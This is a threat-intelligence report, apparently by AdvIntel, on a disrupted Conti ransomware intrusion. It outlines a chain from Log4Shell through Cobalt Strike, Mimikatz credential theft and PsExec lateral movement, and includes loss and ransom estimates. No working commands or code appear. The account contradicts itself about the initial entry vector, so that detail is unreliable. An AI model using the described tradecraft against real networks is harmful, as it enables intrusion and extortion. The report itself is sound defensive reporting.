24 Hours From Log4Shell to Local Admin by Conti Ransomware Group Targeting Fortune 500
TLP: WHITE // declassified as previously classified AdvIntel report on 02/23/2022.

1/12

In the first week of February 2022, AdvIntel's operational interference successfully prevented a
ransomware attack against one of the US’s Fortune 500. Using thorough adversarial
investigation & technology, AdvIntel identified the intrusion and preemptively alerted the targeted
entity, resulting in immediate preventative action that allowed the threat to be neutralized.

At the helm of this disrupted attack was Conti, the successor ofnotorious and highly capable
Russian-speaking ransomware syndicate, Ryuk. Conti has torn through the defense systems of
innumerable prominent corporations and public service providers since its emergence in 2020.

AdvIntel has identified that Conti was able to compromise critical domain trusts including the
primary domain. However, despite the fact that active directory and network shares were also
successfully compromised, enabling Conti to prepare targeted data theft for future extortion

2/12

purposes, AdvIntel was able to disrupt data exfiltration or data loss, before criminals were able to
take action.

The attack started via the Log4J exploitation as exactly as specified in the article by the
BlackBerry Research & Intelligence and Incident Response (IR) affecting Log4j vulnerability in
VMware Horizon. The attacker commands sequence observed was as follows via the AdvIntel
detection of Cobalt Strike commands resulting in the adversaries obtaining the NTDS and also
moving laterally to the remote administrator share allowing access to the domain and enterprise
administrator credentials via Mimikatz module. Finally, the adversaries leveraged remote
execution via PsExec and custom PowerShell active directory reconnaissance scripts.

INVESTIGATIVE REVIEW: “RANSONOMICS”

Conti’s targeted entity is a large, multinational company, with thousands of employees with
reported several billions of dollars in revenue. This scale of operations is enough to constitute it
as an economic microcosm, as this company’s continued functionality is an inextricable factor in
the success of the countless other companies who share their long, complex supply chains.

In other words, in this case, even a momentary interruption of business would be enough to
cause a substantial amount of collateral damage, so with an estimated ransomware business
interruption delta of three weeks or longer, a data blackout caused by a ransomware attack
would be catastrophic.

The fear of cyber attacks shared by corporations as large and established as the target of this
AdvIntel-disrupted attack comes from the ripple effects that would reverberate from any
interruption of business as usual. A production shutdown in any capacity immediately throws the
lives and jobs of its massive worker populace into uncertainty: as key deadlines are missed,
contractual obligations to production associates and stakeholders are broken, fracturing trust and
costing the company large fees.

If this happens, product distribution and release is delayed. The company may experience loss in
brand loyalty as frustrated customers choose to look elsewhere. According to AdvIntel’s
advanced ransomware risk assessment, this type of standstill alone is enough to net the target a
whopping $20 million USD in setback costs, but even this does not cover the total damages.

When data is stolen in a ransomware attack, money is lost due to the inability of the company to
complete core functions that require information it no longer has—however, this chaos is not the
sole motivation behind the attack. Ransomware groups, as their name suggests, demand large
sums for the return of their ill-gotten gains. In this case, based on AdvIntel’s visibility into the
Conti syndicate, their initial demands for the return of target’s data would have likely been around
$50 million USD.

This number seems incredibly high because an experienced syndicate such as Conti does not
expect that payment in full. Like an employee asking to double their salary during a performance
review, Conti asks victims for an unrealistically high ransom demand so that they have room to
negotiate down. By the time they reach an agreement, the estimated $15 million USD the target

4/12

would likely end up paying would seem almost reasonable by comparison. Once paid, recovery
from the attack would still be a lengthy and expensive process. Another $1.5 million USD would
be required to get operations back to where they were prior, and even then, there are now
endless legal complications, which might take months or even years to resolve and cost another
$5 million USD to boot.

Attacks on household names such as in this case are likely to become headlines. After all, if the
company’s systems were breached, its data stolen, what’s to stop customer information from
leaking?
Estimated Loss Avoidance: ~$30-40 million USD (According to AdvIntel’s 20-factor riskassessment report and calculated damage estimation).

FROM INFILTRATION → MITIGATION

Timely threat reporting and early mitigation enabled AdvIntel and the IT team of the targeted
company to intervene when the initial domain breach was detected in early 2022. The initial
vector of this attack was the popular utility logger Log4j, which has come under fire in recent
months for its increasingly exploited security vulnerabilities. However, AdvIntel possessed a
thorough understanding of this specific attack vector, having discovered Conti’s methodology for
exploiting Log4j in December of 2021.

5/12

This AdvIntel graph shows the different elements that constitute a Log4j software exploitation.

After the Java-based logging library’s CVE-2021-44228 vulnerability was discovered to be a
10.0, or CRITICAL, by CISA’s vulnerability database, they predicted it would become a goldmine
for hackers to plumb. Only one week after the vulnerability was exposed, AdvIntel made an
unsettling discovery: Conti was leveraging VPN vulnerability CVE-2018-13379 to target
unpatched devices for its initial attack vector, as is the case for this early breach.

From that initial vector, Conti then compromised the remote monitoring and management
software agent, using the remote desktop application to analyze the network. As with Log4j,
AdvIntel has noted previous exploitations via Atera in the past, explaining how it is employed by
Conti as a legitimate remote monitoring software in order to avoid Cobalt Strike detection. This
repurposing of the software allows for the discrete installation of backdoor software variants such
as Cobalt Strike as well as Trickbot, AnchorDNS, and BazarBackdoor.

6/12

Adversaries leverage Cobalt Strike command-line interfaces to interact with systems and execute
other software during the course of a ransomware operation.

Without AdvIntel warning the company of this infiltration early, Conti would have almost certainly
exfiltrated critical data and been able to hold it for blackmail purposes. Thankfully, they heeded
our advice, and with additional investigation, managed to successfully locate Conti’s deployed
Cobalt Strike beacons and disrupt them, preventing the predicted damage.

AdvIntel has evaluated several Conti-related Cobalt strike sessions in the past, understanding
that among thousands of potential threats, this root event lies at the center, needing to be dealt
with immediately. This innovative methodology of cyber risk prevention has disrupted several
potential attacks of a similar scale in recent months, most recently allowing Chinese PC
manufacturer Lenovo to avoid a similar fate, as well as the Taiwanese Acer Inc.

CONTI RANSOMWARE: AT A GLANCE

The Conti syndicate is divided into six semi-autonomous teams, each having their own
specialized skills and targets. Team Two, which was responsible for this breach, tends to focus
on third-party compromises using lateral movement attacks. This means that the group’s
members are proficient in moving undetected through networks while simultaneously increasing
their own access credentials and privileges. Like cancer, their presence quickly metastasizes
within the network as they shift from peripheral segments to core domains.

The “Shell Handler” method allows for penetration of a network that is unfeasible by more overt
methods such as VPN and email attachment.

What sets Conti apart from other ransomware groups is its coordination and functionality as an
organization. Where other ransomware groups are small and unsystematic, Conti has a business
model, defined strategies for attack, and the ability to work quickly and effectively as a unit. To
date, they are the only ransomware group that has truly earned the label of a syndicate. This is
what makes them especially dangerous.

ATTACK CONTEXTUALIZATION
8/12

To exemplify the potential damages and losses which could have been faced by the target in a
successful attack, AdvIntel refers to other recent notable ransomware high-tech
manufacturing attacks (with the use of CVEs). These attacks are similar to the one in this
case study in terms of scale, attack vectors, and industry specifics.
ASUStek Computer Inc., April 2019
Compal Electronics (by DoppelPaymer), November 2020
Acer Inc. (by REvil), October 2021
Quanta Computer Inc. (REvil),April 2021

Based on the Adversarial Assessment Scale utilized by the National Institute of Standards and
Technology (NIST Special Publication 800-30, Guide for Conducting Risk Assessments, Table D3), AdvIntel would consider Conti to be a 10 or VERY HIGH CAPABILITY, due to their level of
expertise and resources, as well as their coordination and competency in executing high-level
attacks.
